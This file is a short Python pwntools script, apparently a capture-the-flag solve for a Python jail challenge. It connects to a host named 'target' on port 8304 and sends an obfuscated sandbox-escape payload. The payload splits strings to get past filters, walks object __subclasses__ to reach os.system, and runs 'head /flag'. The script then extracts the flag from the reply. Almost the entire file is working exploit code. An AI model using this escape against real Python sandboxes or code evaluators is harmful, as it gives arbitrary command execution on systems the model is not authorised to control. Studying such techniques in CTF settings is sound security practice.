#!/usr/bin/env python3
import re
import time

from pwn import remote

PAYLOAD = (
    b"[c for c in ().__class__.__class__.__dict__['__ba'+'ses__'].__get__(().__class__)[0].__subclasses__() "
    b"if c.__name__=='IncrementalEncoder'][0].__init__.__globals__"
    b"['sy'+'s'].modules['o'+'s'].__dict__['sy'+'stem']('he'+'ad /fl'+'ag')"
)


def main() -> int:
    r = remote("target", 8304)
    r.recvuntil(b"> ")
    r.sendline(PAYLOAD)
    time.sleep(0.6)
    data = r.recv(timeout=2)
    print(data.decode("latin1", "replace"), flush=True)
    r.close()
    m = re.search(rb"[A-Za-z0-9_]+\{[^}]+\}", data)
    if not m:
        return 1
    print(m.group(0).decode(), flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
